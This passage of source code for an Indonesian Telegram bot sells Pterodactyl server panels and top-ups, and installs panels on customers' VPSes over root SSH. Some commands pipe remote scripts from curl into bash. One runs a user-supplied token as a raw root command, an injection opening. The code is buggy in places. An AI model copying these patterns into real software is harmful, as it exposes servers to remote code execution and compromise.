            `https://api.rafaelxputra.my.id/api/orkut/createpayment?apikey=rafael&amount=${totalAmount}&codeqr=${codeqr}`
        );
        const paymentData = await paymentResponse.json();
        if (!paymentData || !paymentData.result) return Rafael.reply('Gagal membuat pembayaran.');

        const { transactionId, qrImageUrl, expirationTime } = paymentData.result;
        const timeLeft = Math.max(0, Math.floor((new Date(expirationTime) - new Date()) / 60000));
        const formattedTime = new Date(new Date().getTime() + timeLeft * 60000).toLocaleTimeString('id-ID', {
            hour: '2-digit',
            minute: '2-digit',
        });

        const paymentText = `Detail Pembayaran Anda\n\n` +
            `ID Transaksi: ${transactionId}\n` +
            `Nominal: Rp. ${toRupiahh(harga)}\n` +
            `PPN: Rp. ${toRupiahh(ppn)}\n` +
            `Total: Rp. ${toRupiahh(totalAmount)}\n` +
            `Waktu: ${timeLeft} menit\n\n` +
            `Scan QRIS sebelum ${formattedTime}.`;

        // Send payment information with QR image
        await Rafael.replyWithPhoto(qrImageUrl, { caption: paymentText });

        let isTransactionComplete = false;

        // Timer to cancel the transaction if not completed within 5 minutes
        setTimeout(async () => {
            if (!isTransactionComplete) {
                await Rafael.reply('Transaksi dibatalkan otomatis karena waktu habis.');
            }
        }, 5 * 60 * 1000);

        // Check transaction status periodically
        while (!isTransactionComplete) {
            try {
                const statusResponse = await axios.get(
                    `https://api.rafaelxputra.my.id/api/orkut/cekstatus?merchant=${merchant}&keyorkut=${keyorkut}`
                );
                const statusData = statusResponse.data;

                if (statusData && parseInt(statusData.amount) === totalAmount) {
                    isTransactionComplete = true;
                    await Rafael.reply('Pembayaran berhasil!');

                    // Create user and server
                    const createUserResponse = await fetch(`${urlrafael}/api/application/users`, {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${apikey2}`,
                        },
                        body: JSON.stringify({
                            email,
                            username: username.toLowerCase(),
                            first_name: name,
                            last_name: 'Server',
                            language: 'en',
                            password,
                        }),
                    });

                    const userData = await createUserResponse.json();
                    if (userData.errors) return Rafael.reply(JSON.stringify(userData.errors[0], null, 2));

                    const createServerResponse = await fetch(`${urlrafael}/api/application/servers`, {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${apikey2}`,
                        },
                        body: JSON.stringify({
                            name,
                            description: new Date().toLocaleDateString(),
                            user: userData.attributes.id,
                            egg: parseInt(egg),
                            docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
                            startup: 'npm start',
                            environment: { INST: 'npm', USER_UPLOAD: '0', AUTO_UPDATE: '0', CMD_RUN: 'npm start' },
                            limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                            feature_limits: { databases: 5, backups: 5, allocations: 5 },
                            deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
                        }),
                    });

                    const serverData = await createServerResponse.json();
                    if (serverData.errors) throw new Error(JSON.stringify(serverData.errors[0], null, 2));

                    const serverDetails = `*Akun Panel Berhasil Dibuat*\n\n` +
                        `ID Server: ${serverData.attributes.id}\n` +
                        `Username: ${username}\n` +
                        `Password: ${password}\n` +
                        `Login: ${urlrafael}\n\n` +
                        `Detail Paket\n` +
                        `RAM: ${ram === '0' ? 'Unlimited' : ram + ' MB'}\n` +
                        `CPU: ${cpu === '0' ? 'Unlimited' : cpu + '%'}\n` +
                        `Disk: ${disk === '0' ? 'Unlimited' : disk + ' MB'}\n`;

                    await Rafael.reply(serverDetails);
                }
            } catch (error) {
                console.error('Error checking transaction status:', error);
            }

            if (!isTransactionComplete) await new Promise((resolve) => setTimeout(resolve, 10000));
        }
    } catch (error) {
        console.error('Error:', error);
        Rafael.reply('Terjadi kesalahan dalam memproses pembayaran.');
    }
});

bot.command('installpanel', async (Rafael) => {
    const userId = Rafael.from.id;
amount = 5000
   // Gunakan saldo
    const result = useUserBalance(userId, amount);

  const message = Rafael.message.text;
  const args = message.split(' ').slice(1).join('');

  if (!args) {
    return Rafael.reply("Format salah! Contoh:\n`/installpanel ipvps|pwvps|panel.com|node.com|ramserver`", { parse_mode: 'Markdown' });
  }
    if (!result.success) {
        return Rafael.reply(result.message); // Jika saldo tidak mencukupi atau pengguna tidak ditemukan
    }
  let vii = args.split('|');
  if (vii.length < 5) {
    return Rafael.reply("Format kurang lengkap! Contoh:\n`/installpanel ipvps|pwvps|panel.com|node.com|ramserver`", { parse_mode: 'Markdown' });
  }

  let sukses = false;
  const ress = new Client();
  const connSettings = {
    host: vii[0],
    port: '22',
    username: 'root',
    password: vii[1]
  };

  const pass = "admin";
  let passwordPanel = pass;
  const domainpanel = vii[2];
  const domainnode = vii[3];
  const ramserver = vii[4];
  const deletemysql = `\n`;
  const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

  async function instalWings() {
    ress.exec(commandPanel, (err, stream) => {
      if (err) throw err;
      stream.on('close', async () => {
        ress.exec('bash <(curl -s https://github.com/rafaelpermenkaret/installer/blob/main/createnode.sh)', async (err, stream) => {
          if (err) throw err;
          stream.on('close', async () => {
            let teks = `
Berikut Detail Akun Panel :

𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : admin
𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ${passwordPanel}
𝗗𝗼𝗺𝗮𝗶𝗻 : ${domainpanel}

𝗡𝗼𝘁𝗲 : Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

Cara Menjalankan Wings :
Ketik: \`/startwings ipvps|pwvps|tokenwings\`
`;
            await Rafael.reply(teks, { parse_mode: 'Markdown' });
          }).on('data', (data) => {
            console.log(data.toString());
            if (data.toString().includes("Masukkan nama lokasi: ")) stream.write('Singapore\n');
            if (data.toString().includes("Masukkan deskripsi lokasi: ")) stream.write('Node By Rafael\n');
            if (data.toString().includes("Masukkan domain: ")) stream.write(`${domainnode}\n`);
            if (data.toString().includes("Masukkan nama node: ")) stream.write('Node By Rafael\n');
            if (data.toString().includes("Masukkan RAM (dalam MB): ")) stream.write(`${ramserver}\n`);
            if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) stream.write(`${ramserver}\n`);
          }).stderr.on('data', (data) => console.log('Stderr : ' + data));
        });
      });
    });
  }

  async function instalPanel() {
    ress.exec(commandPanel, (err, stream) => {
      if (err) throw err;
      stream.on('close', async () => {
        await instalWings();
      }).on('data', (data) => {
        if (data.toString().includes('Database name (panel)')) stream.write('\n');
        if (data.toString().includes('Database username (pterodactyl)')) stream.write('admin\n');
        if (data.toString().includes('Password for the initial admin account')) stream.write(`${passwordPanel}\n`);
        if (data.toString().includes('Set the FQDN of this panel')) stream.write(`${domainpanel}\n`);
        if (data.toString().includes('Provide the email address')) stream.write('admin@gmail.com\n');
        console.log('Logger: ' + data.toString());
      }).stderr.on('data', (data) => console.log('STDERR: ' + data));
    });
  }

  Rafael.reply("🔧 Memproses 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 server panel...\nTunggu 1-10 menit hingga proses selesai", { parse_mode: 'Markdown' });

  ress.on('ready', async () => {
    ress.exec(deletemysql, async (err, stream) => {
      if (err) throw err;
      stream.on('close', async () => {
        await instalPanel();
      }).on('data', (data) => {
        console.log(data.toString());
      }).stderr.on('data', (data) => console.log('Stderr : ' + data));
    });
  }).connect(connSettings);

  ress.on('error', (err) => {
    Rafael.reply(`❌ Gagal terhubung ke server:\n\`${err.message}\``, { parse_mode: 'Markdown' });
  });
});

bot.command('startwings', async (Rafael) => {
    const userId = Rafael.from.id;
amount = 2000
   // Gunakan saldo
    
  const message = Rafael.message.text;
  const args = message.split(' ').slice(1).join(''); // Ambil teks setelah /startwings

  // Validasi input
  if (!args) {
    return Rafael.reply("Format salah! Contoh:\n`/startwings ipvps|pwvps|token_node`", { parse_mode: 'Markdown' });
  }

  let t = args.split('|');
  if (t.length < 3) {
    return Rafael.reply("Format tidak lengkap! Contoh:\n`/startwings ipvps|pwvps|token_node`", { parse_mode: 'Markdown' });
  }
const result = useUserBalance(userId, amount);
    if (!result.success) {
        return Rafael.reply(result.message); // Jika saldo tidak mencukupi atau pengguna tidak ditemukan
    }
  let ipvps = t[0];
  let passwd = t[1];
  let token = t[2];

  const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
  };

  const command = `${token} && systemctl start wings`;
  const ress = new Client();

  Rafael.reply(`🔧 *Menghubungkan ke server...*\nIP: \`${ipvps}\``, { parse_mode: 'Markdown' });

  ress.on('ready', () => {
    ress.exec(command, (err, stream) => {
      if (err) {
        Rafael.reply("❌ Terjadi kesalahan saat mengeksekusi perintah.");
        throw err;
      }

      stream.on('close', async () => {
        await Rafael.reply("✅ *Wings berhasil dijalankan!*\n*Status Wings:* `aktif`", { parse_mode: 'Markdown' });
        ress.end();
      }).on('data', (data) => {
        console.log('OUTPUT:', data.toString());
      }).stderr.on('data', (data) => {
        console.log('STDERR:', data.toString());
        stream.write("y\n");
        stream.write("systemctl start wings\n");
        Rafael.reply("⚠️ Terjadi kesalahan:\n" + data.toString());
      });
    });
  }).on('error', (err) => {
    console.log('Connection Error: ' + err);
    Rafael.reply("❌ Katasandi atau IP tidak valid. Coba periksa kembali input Anda.");
  }).connect(connSettings);
});

bot.command('txt2img', async (Rafael) => {
    const text = Rafael.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah perintah
    if (!text) {
        return Rafael.reply('Contoh: /txt2imgv5 beautiful girl with handsome man');
    }

    try {
        const response = await fetch(`https://itzpire.com/ai/animediff2?prompt=${encodeURIComponent(text)}`);
        const io = await response.json();

        // Kirim gambar ke pengguna
        if (io.result) {
            await Rafael.replyWithPhoto({ url: io.result }, { caption: 'Here is your AI-generated image!' });
        } else {
            await Rafael.reply('Maaf, terjadi kesalahan saat menghasilkan gambar.');
        }
    } catch (error) {
        console.error(error);
        await Rafael.reply('Maaf, terjadi kesalahan saat memproses permintaan Anda.');
    }
});


bot.command('carbon', async (Rafael) => {
  const message = Rafael.message;
  const text = message.text.split(' ').slice(1).join(' '); // Ambil teks setelah perintah '/carbon'

  let tulisan = text;
  if (message.reply_to_message && message.reply_to_message.text) {
    tulisan = message.reply_to_message.text;
  }

  if (!tulisan) {
    return Rafael.reply(`Contoh: /carbon toyaa`);
  }

  try {
    const buffer = await CarbonifyV1(tulisan);
    await Rafael.replyWithPhoto({ source: buffer }, { caption: global.wm });
  } catch (error) {
    try {
      const buffer = await CarbonifyV2(tulisan);
      await Rafael.replyWithPhoto({ source: buffer }, { caption: global.wm });
    } catch (err) {
      Rafael.reply('Terjadi kesalahan: ' + err.toString());
    }
  }
});


async function AI(content) {
  try {
    const response = await axios.post('https://luminai.my.id/', {
      content,
      cName: "S-AI",
      cID: "S-AIbAQ0HcC",
    });

    // Kembalikan hasil dari respons
    return response.data;
  } catch (error) {
    console.error('Error saat menghubungi API:', error.message);
    throw new Error('Terjadi kesalahan saat menghubungi AI. Silakan coba lagi nanti.');
  }
}

// Fungsi untuk membuat gambar
async function generateImage(text) {
  try {
    const imageUrl = `https://itzpire.com/ai/animediff2?prompt=${encodeURIComponent(text)}`;
    return imageUrl;
  } catch (error) {
    console.error('Error saat membuat gambar:', error.message);
    throw new Error('Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}

// Event listener untuk pesan teks
bot.on('text', async (Rafael) => {
  try {
    // Ambil dan proses pesan pengguna
    const message = Rafael.message.text.trim();
    const lowerMessage = message.toLowerCase();
    const keywords = ['ai', 'chatgpt', 'buatkan'];

    // Periksa jika pesan diawali dengan kata kunci
    for (const keyword of keywords) {
      if (lowerMessage.startsWith(keyword)) {
        const text = message.slice(keyword.length).trim();

        // Validasi input: Jika kosong, berikan contoh penggunaan
        if (!text) {
          return Rafael.reply(`Contoh: ${keyword} Apa kabar?`);
        }

        if (keyword === 'buatkan') {
          // Buat gambar dan kirimkan
          const imageUrl = await generateImage(text);
          return Rafael.replyWithPhoto(imageUrl);
        } else {
          // Panggil API AI
          const aiResponse = await AI(text);

          // Cek respons dari API
          const result = aiResponse.result || 'Maaf, saya tidak dapat memberikan respons.';
          return Rafael.reply(result);
        }
      }
    }
  } catch (error) {
    console.error('Error saat memproses pesan:', error.message);
    return Rafael.reply('Maaf, terjadi kesalahan saat memproses permintaan Anda. Silakan coba lagi.');
  }
});

bot.command('beli', async (Rafael) => {
    try {
        const text = Rafael.message.text.split(" ").slice(1).join(" ");
        if (!text) 
            return Rafael.reply("Masukkan ID Produk|Nomor Anda (atau ID Game).");

        let t = text.split("|");
        if (t.length < 2) 
            return Rafael.reply("Masukkan ID Produk|Nomor Anda (atau ID Game).");

        let itemID = t[0].trim();
        let number = t[1].trim();
        let refID = genreff(); // Pastikan fungsi genreff() telah dibuat

        let { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let item = data.find(v => v.kode === itemID);
        if (!item) 
            return Rafael.reply("Produk tidak ditemukan. Periksa kembali ID produk Anda.");
        if (item.status !== "1") 
            return Rafael.reply("Status item ini tidak ready!");

        let harga = countProfit(item.harga); // Pastikan fungsi countProfit() telah dibuat


        let { data: result } = await axios.get(
            `https://h2h.okeconnect.com/trx?product=${itemID}&dest=${number}&refID=${refID}&memberID=${memberID}&pin=${pin}&password=${pw}`
        );

        if (/GAGAL/i.test(result)) {
            return Rafael.reply("Transaksi gagal. Silakan coba lagi.");
        }

const ppqe = useUserBalance(userId, harga);
    if (!ppqe.success) {
        return Rafael.reply(ppqe.message); // Jika saldo tidak mencukupi atau pengguna tidak ditemukan
    }

        let caption = `
*PEMBELIAN BERHASIL!*

RefID : ${refID}
Item : ${item.keterangan}
Harga: ${harga}
Waktu : ${formattedDate(Date.now())}
Payment: Qris

_Terimakasih sudah bertransaksi di Rafael Store!_
`.trim();
        Rafael.replyWithMarkdown(caption);
    } catch (err) {
        console.error(err);
        Rafael.reply("Terjadi kesalahan saat memproses transaksi. Silakan coba lagi nanti.");
    }
});

CFonts.say('bot Telegram', { font: 'tiny', align: 'center', colors: ['system'] });
CFonts.say('Script No ENC Di Jual Oleh Rafael, Jika Ingin Membeli Silahkan Hubungin Telegram @RafaMods Atau WhatsApp: 089517657040', { font: 'console', align: 'center', colors: ['system'] });
bot.launch();
console.log(chalk.yellowBright.bold('Bot Telegram By RafaelXD'));




